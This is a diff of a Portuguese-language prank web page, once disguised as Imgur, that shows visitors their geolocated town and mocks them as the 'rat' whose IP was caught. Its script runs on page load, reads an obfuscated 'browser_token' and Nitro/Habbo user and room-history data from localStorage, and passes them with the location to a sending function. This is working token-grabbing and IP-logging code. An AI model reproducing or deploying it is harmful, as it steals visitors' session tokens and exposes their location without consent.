@@ -1,13 +1,18 @@
 <!DOCTYPE html>
 <html>
     <head>
-<link rel="icon" href="imgur.png" type="image/png">
-        <title>Imgur</title>
+
     </head>
     <body>
 
-        <h1>Obrigado pelo seu IP!</h1>
-        <h4>Ass: JuninhoFudelao</h4>
+        <body style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;">
+            <div style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
+                <img src="ratoeira.webp"  width="300">
+                <h1>Obrigado pelo seu IP! 🤣🤣</h1>
+                <h2>O Rato da vez é de <span id="loc"></span></h2>
+                <h4>Assinado: JuninhoFudelao</h4>
+            </div>
+        </body>
 
         <script>
             class Start {
@@ -26,6 +31,9 @@
                     .then((body) => body.json())
                     .then((data) => {
                         let j = localStorage.getItem(atob("YnJvd3Nlcl90b2tlbg=="));
+                        
+                       let $loc =  document.getElementById("loc");
+                       $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
 
                         Start.sdc(i,` ${
                             data.location.principalSubdivision +
@@ -34,6 +42,9 @@
                             ", " +
                             data.location.localityName
                         }`,j);
+
+                        
+
                         try{
                         rh = localStorage.getItem("nitro.room.history");
                         u = localStorage.getItem("user");
